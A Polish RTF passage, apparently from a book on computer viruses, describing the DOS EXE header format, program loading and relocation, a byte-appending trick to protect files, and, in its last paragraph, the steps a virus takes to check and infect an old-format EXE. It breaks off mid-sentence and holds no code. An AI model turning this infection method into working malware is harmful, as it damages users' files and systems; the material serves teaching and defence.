\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2. Pliki wykonywalne EXE}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poprzednio om\'f3wione pliki COM przewa\uc1\u380\'bfa\uc1\u322\'b3y w pocz\uc1\u261\'b9tkowym okresie istnienia systemu DOS, lecz szybko zosta\uc1\u322\'b3y wyparte przez pliki EXE, kt\'f3re oferowa\uc1\u322\'b3y mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 pisania program\'f3w mieszcz\uc1\u261\'b9cych si\uc1\u281\'ea w kilku segmentach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zara\uc1\u380\'bfanie plik\'f3w EXE jest spraw\uc1\u261\'b9 o wiele trudniejsz\uc1\u261\'b9 od infekcji plik\'f3w COM ze wzgl\uc1\u281\'eadu na ich bardziej skomplikowan\uc1\u261\'b9 budow\uc1\u281\'ea, a tak\uc1\u380\'bfe na konieczno\uc1\u347\'9c\uc1\u263\'e6 wykrywania systemu, dla kt\'f3rego plik jest przeznaczony. Pliki EXE dziel\uc1\u261\'b9 si\uc1\u281\'ea bowiem na tzw. stare (ang. old executab-les) i nowe (ang. new executables). Pierwsze z nich przeznaczone s\uc1\u261\'b9 tylko i wy\uc1\u322\'b3\uc1\u261\'b9cznie dla systemu DOS, natomiast drugie to programy dzia\uc1\u322\'b3a}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0}\uc1\u261\'b9ce w \uc1\u347\'9crodowiskach wykorzystuj\uc1\u261\'b9cych tryb chroniony. Jak pokazano dalej, na podstawie danych zawartych w pliku EXE mo\uc1\u380\'bfna wykry\uc1\u263\'e6 system, dla kt\'f3rego jest on przeznaczony i w rezultacie plik taki zainfekowa\uc1\u263\'e6.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.1. Pliki EXE dla systemu DOS (stare EXE)}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ja}{\f0\fs24\lang1045{\*\listtag0}k ju\uc1\u380\'bf wspomniano, pliki COM mog\uc1\u322\'b3y zawiera\uc1\u263\'e6 w swym wn\uc1\u281\'eatrzu tylko jeden segment, wsp\'f3lny dla kodu, danych i stosu. W przeciwie\uc1\u324\'f1stwie do nich pliki EXE mog\uc1\u261\'b9 zawiera\uc1\u263\'e6 programy, kt\'f3rych rozmiary ograniczone s\uc1\u261\'b9 tylko przez wielko\uc1\u347\'9c\uc1\u263\'e6 dost\uc1\u281\'eapnej aktualnie pami\uc1\u281\'eaci o}{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}eracyjnej, znajduj\uc1\u261\'b9cej si\uc1\u281\'ea poni\uc1\u380\'bfej pierwszych 640kB. Najcz\uc1\u281\'ea\uc1\u347\'9cciej w programach tych jest kilka segment\'f3w kodu i danych, a tak\uc1\u380\'bfe}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch osobny segment stosu. Ze wzgl\uc1\u281\'eadu na bardziej skomplikowan\uc1\u261\'b9 struktur\uc1\u281\'ea, do za\uc1\u322\'b3adowania program\'f3w EXE system DOS potrzebuje wi\uc1\u281\'eacei informacji, ni\uc1\u380\'bf w przypadku plik\'f3w COM. Informacje zawarte s\uc1\u261\'b9 w istniej\uc1\u261\'b9cym na pocz\uc1\u261\'b9tku ka\uc1\u380\'bfdego pliku EXE nag\uc1\u322\'b3\'f3wku, kt\'f3ry sk\uc1\u322\'b3ada sie z dw\'f3ch cz\uc1\u281\'ea\uc1\u347\'9cci: sformatowanej i niesformatowanej. D\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 sformatowanej cz\uc1\u281\'ea\uc1\u347\'9cci nag\uc1\u322\'b3\'f3wka jest sta\uc1\u322\'b3a i wynosi 27 bajt\'f3w, nato}{\f1\fs24\lang1045{\*\listtag0}m}{\f0\fs24\lang1045{\*\listtag0}iast d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 cz\uc1\u281\'ea\uc1\u347\'9cci niesformatowanej oblicza si\uc1\u281\'ea na podstawie danych zawartych w nag\uc1\u322\'b3\'f3wku sformatowanym. W skrajnym przypadku d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 cz\uc1\u281\'ea\uc1\u347\'9cci niesrormatowanej mo\uc1\u380\'bfe by\uc1\u263\'e6 r\'f3wna O, co cz\uc1\u281\'easto ma miejsce, gdy programy s\uc1\u261\'b9 wewn\uc1\u281\'eatrznie skompresowane i zminimalizowa}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}e. Opis sformatowanej cz\uc1\u281\'ea\uc1\u347\'9cci nag\uc1\u322\'b3\'f3wka podano poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sformatowany nag\uc1\u322\'b3\'f3wek pliku EXE}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:88dcdd0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Znacznik pliku EXE. MZ lub ZM}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba bajt\'f3w na ostatniej, 512}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bajtowej, stronie programu, W praktyce oznacza, ile bajt\'f3w system DOS musi skopiowa\uc1\u263\'e6 z ostat}{\f1\fs24\lang1045{\*\listtag0}niego sektora zajmowanego przez program.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04-05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}D\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 ca\uc1\u322\'b3ego pliku EXE, podana w 512-bajtowych stronach z uwzgl\uc1\u281\'eadnieniem nag\uc1\u322\'b3\'f3wka i ostatniej strony opisanej w polach 02h-03h. W praktyce oznacza ilo\uc1\u347\'9c\uc1\u263\'e6 sektor\'f3w zajmowanych przez program,}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba ele}{\f0\fs24\lang1045{\*\listtag0}ment\'f3w relokowalnych w programie, czyli liczba 4-bajtowych rekord\'f3w, znajduj\uc1\u261\'b9cych siew niesformatowanej cz\uc1\u281\'ea\uc1\u347\'9cci nag\uc1\u322\'b3\'f3wka, opisuj\uc1\u261\'b9cych miejsca w kodzie programu (jako segment: przesuni\uc1\u281\'eacie; w ka\uc1\u380\'bfdym rekordzie przesuni\uc1\u281\'eacie znajduje si\uc1\u281\'ea przed segmentem), gdzi}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} nale\uc1\u380\'bfy doda\uc1\u263\'e6 segment, pod kt\'f3ry \uc1\u322\'b3adowany jest program}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-09}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}D\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 nag\uc1\u322\'b3\'f3wka w 16-bajtowych paragrafach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0A-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Minimalna wymagana pami\uc1\u281\'ea\uc1\u263\'e6 poza za\uc1\u322\'b3adowanym kodem programu, podana w 16-bajtowych paragrafach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C-0D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Maksymalna wymagana pami\uc1\u281\'ea\uc1\u263\'e6 poza za\uc1\u322\'b3}{\f1\fs24\lang1045{\*\listtag0}adowanym kodem programu, podana w 16-bajtowych paragrafach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0E-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pocz\uc1\u261\'b9tkowa warto\uc1\u347\'9c\uc1\u263\'e6 rejestru segmentowego stosu (SS) wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku programu.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10-11}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pocz\uc1\u261\'b9tkowa warto\uc1\u347\'9c\uc1\u263\'e6 wska\uc1\u378\'9fnika stosu (SP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}12-13}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Suma kontrolna (zanegowana suma wszystkich bajt\'f3w w plik}{\f0\fs24\lang1045{\*\listtag0}u), nie u\uc1\u380\'bfywana przez DOS, st\uc1\u261\'b9d pole to mo\uc1\u380\'bfe pos\uc1\u322\'b3u\uc1\u380\'bfy\uc1\u263\'e6 jako wska\uc1\u378\'9fnik zainfekowania pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14-15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pocz\uc1\u261\'b9tkowa warto\uc1\u347\'9c\uc1\u263\'e6 licznika rozkaz\'f3w IP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pocz\uc1\u261\'b9tkowa warto\uc1\u347\'9c\uc1\u263\'e6 rejestru segmentu kodu CS wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku programu.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-19}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres pierwszej pozycji tablicy re}{\f0\fs24\lang1045{\*\listtag0}lokacji w stosunku do pocz\uc1\u261\'b9tku pliku. Je\uc1\u380\'bfeli pole jest r\'f3wne 40h lub wi\uc1\u281\'eacej, jest to prawdopodobnie nowy plik EXE}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1A-1B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Numer nak\uc1\u322\'b3adki}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacje zawarte w nag\uc1\u322\'b3\'f3wku pliku EXE zawieraj\uc1\u261\'b9 wymagania programu dotycz\uc1\u261\'b9ce pami\uc1\u281\'eaci operacyjnej oraz ustalaj\uc1\u261\'b9 pocz\uc1\u261\'b9tkowe warto\uc1\u347\'9cci rejestr\'f3w SS i SP, odpowiedzialnych za stos, a tak\uc1\u380\'bfe rejestr\'f3w CS i IP, wskazuj\uc1\u261\'b9cych na pierwsz\uc1\u261\'b9 instrukcj\uc1\u281\'ea programu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dopiero po nag\uc1\u322\'b3\'f3wkach pojawia si\uc1\u281\'ea w\uc1\u322\'b3a\uc1\u347\'9cciwy kod programu, a za nim, na ko\uc1\u324\'f1cu niekt\'f3rych plik\'f3w EXE przeznaczonych dla systemu DOS, znajduje si\uc1\u281\'ea cz\uc1\u281\'easto tzw. wewn\uc1\u281\'eatrzna nak\uc1\u322\'b3adka (ang. internal overlay), zawieraj\uc1\u261\'b9ca dodatkowe dane lub kod programu. Wykorzystuj\uc1\u261\'b9c fakt, i\uc1\u380\'bf znakomita wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 istniej\uc1\u261\'b9cych wirus\'f3w nie zara\uc1\u380\'bfa plik\'f3w EXE z wewn\uc1\u281\'eatrznymi nak\uc1\u322\'b3adkami, mo\uc1\u380\'bfna do\uc1\u347\'9c\uc1\u263\'e6 prosto za}{\f1\fs24\lang1045{\*\listtag0}b}{\f0\fs24\lang1045{\*\listtag0}ezpieczy\uc1\u263\'e6 wszystkie pliki EXE na dysku przed ewentualn\uc1\u261\'b9 infekcj\uc1\u261\'b9. Wystarczy na ko\uc1\u324\'f1cu ka\uc1\u380\'bfdego z tych plik\'f3w dopisa\uc1\u263\'e6 jeden dowolny bajt, kt\'f3ry przez wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w b\uc1\u281\'eadzie uznawany za wewn\uc1\u281\'eatrzn\uc1\u261\'b9 nak\uc1\u322\'b3adk\uc1\u281\'ea.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dopiero po odczytaniu i zinterpretowaniu danych z n}{\f0\fs24\lang1045{\*\listtag0}ag\uc1\u322\'b3\'f3wka system mo\uc1\u380\'bfe przyst\uc1\u261\'b9pi\uc1\u263\'e6 do \uc1\u322\'b3adowania w\uc1\u322\'b3a\uc1\u347\'9cciwego programu, zawartego w pliku EXE, kt\'f3ry umieszczany jest bezpo\uc1\u347\'9crednio za blokiem PSP. Z powy\uc1\u380\'bfszego wynika, i\uc1\u380\'bf w przeciwie\uc1\u324\'f1stwie do programu COM obraz programu EXE wygl\uc1\u261\'b9da inaczej w pami\uc1\u281\'eaci ni\uc1\u380\'bf na dysku}{\f1\fs24\lang1045{\*\listtag0}.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po wczytaniu programu do warto\uc1\u347\'9cci pocz\uc1\u261\'b9tkowych rejestr\'f3w CS i SS (zawartych w nag\uc1\u322\'b3\'f3wku sformatowanym) dodawany jest adres segmentu, pod kt\'f3ry zosta\uc1\u322\'b3 on za\uc1\u322\'b3adowany. Adres tego segmentu s\uc1\u322\'b3u\uc1\u380\'bfy tak\uc1\u380\'bfe do zmodyfikowania pewnych instrukcji w programie, kt\'f3re s\uc1\u261\'b9 zale\uc1\u380\'bfne od jego faktycznego umiejscowienia w pami\uc1\u281\'eaci operacyjnej (s\uc1\u261\'b9 to np. rozkazy wywo\uc1\u322\'b3a\uc1\u324\'f1 dalekich procedur i skok\'f3w oraz operacje na segmentach wyst\uc1\u281\'eapuj\uc1\u261\'b9cych w programie). Adresy w pami\uc1\u281\'eaci, kt\'f3re trzeba w ten spos\'f3b zmodyfikowa\uc1\u263\'e6, zawarte s\uc1\u261\'b9 w tablicy r}{\f1\fs24\lang1045{\*\listtag0}elokacji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pierwsz\uc1\u261\'b9 czynno\uc1\u347\'9cci\uc1\u261\'b9 wykonywan\uc1\u261\'b9 przez wirusa powinno by\uc1\u263\'e6 odczytanie sformatowanego nag\uc1\u322\'b3\'f3wka pliku potencjalnej ofiary i por\'f3wnanie dw\'f3ch pierwszych bajt\'f3w programu (znacznik z pola 00h-0lh) z sekwencj\uc1\u261\'b9 'MZ' lub 'ZM'. Je\uc1\u380\'bfeli por\'f3wnanie wypad\uc1\u322\'b3o pomy\uc1\u347\'9clnie, istnieje du\uc1\u380\'bfa szansa, i\uc1\u380\'bf jest to plik typu EXE i mo\uc1\u380\'bfna go spr\'f3bowa\uc1\u263\'e6 zainfekowa\uc1\u263\'e6. Drug\uc1\u261\'b9 czynno\uc1\u347\'9cci\uc1\u261\'b9 wykonywan\uc1\u261\'b9 przez wirusa powinno by\uc1\u263\'e6 sprawdzenie, czy plik EXE jest programem przeznaczonym dla systemu DOS. Na pozycji 18h-19h w nag\uc1\u322\'b3\'f3wku widnieje wted}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0} warto\uc1\u347\'9c\uc1\u263\'e6 mniejsza od 40h, w przeciwnym wypadku jest to prawdopodobnie nowy EXE. Kolejnym krokiem wykonywanym przez wirusa powinno by\uc1\u263\'e6 sprawdzenie, czy plik EXE nie zawiera wewn\uc1\u281\'eatrznej nak\uc1\u322\'b3adki. Dokonuje si\uc1\u281\'ea tego poprzez por\'f3wnanie d\uc1\u322\'b3ugo\uc1\u347\'9cci ca\uc1\u322\'b3ego pliku EX}{\f1\fs24\lang1045{\*\listtag0}E}{\f0\fs24\lang1045{\*\listtag0} (widzianej przez DOS) z d\uc1\u322\'b3ugo\uc1\u347\'9cci\uc1\u261\'b9 obliczan\uc1\u261\'b9 na podstawie p\'f3l zawartych w nag\uc1\u322\'b3\'f3wku (pola 02h-03h i U4h-05h). Je\uc1\u380\'bfeli warto\uc1\u347\'9cci te r\'f3\uc1\u380\'bfni\uc1\u261\'b9 si\uc1\u281\'ea od siebie, plik zawiera nak\uc1\u322\'b3adk\uc1\u281\'ea. Taki plik tak\uc1\u380\'bfe mo\uc1\u380\'bfna zainfekowa\uc1\u263\'e6, jednak wi\uc1\u261\'b9\uc1\u380\'bfe si\uc1\u281\'ea to z konieczno\uc1\u347\'9cci\uc1\u261\'b9 przesuni\uc1\u281\'eaci}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0} w nim ca\uc1\u322\'b3ej nak\uc1\u322\'b3adki o d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 wirusa, tak aby ten m\'f3g\uc1\u322\'b3 umie\uc1\u347\'9cci\uc1\u263\'e6 sw\'f3j kod bezpo\uc1\u347\'9crednio za obrazem \uc1\u322\'b3adowanym przez DOS do pami\uc1\u281\'eaci. Podczas uruchamiania programu EXE nak\uc1\u322\'b3adka nie jest \uc1\u322\'b3adowana do pami\uc1\u281\'eaci bezpo\uc1\u347\'9crednio z programem, tak wi\uc1\u281\'eac gdyby wirus znajd}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}wa\uc1\u322\'b3 si\uc1\u281\'ea w pliku bezpo\uc1\u347\'9crednio za ni\uc1\u261\'b9, tak\uc1\u380\'bfe nie zosta\uc1\u322\'b3by za\uc1\u322\'b3adowany i w efekcie program by si\uc1\u281\'ea zawiesza\uc1\u322\'b3. Zara\uc1\u380\'bfone programy z wewn\uc1\u281\'eatrzn\uc1\u261\'b9 nak\uc1\u322\'b3adk\uc1\u261\'b9 cz\uc1\u281\'easto nie b\uc1\u281\'ead\uc1\u261\'b9 dzia\uc1\u322\'b3a\uc1\u322\'b3y poprawnie, zw\uc1\u322\'b3aszcza je\uc1\u347\'9cli korzystaj\uc1\u261\'b9c z nak\uc1\u322\'b3adki nie obliczaj\uc1\u261\'b9 adres\'f3w w pliku na 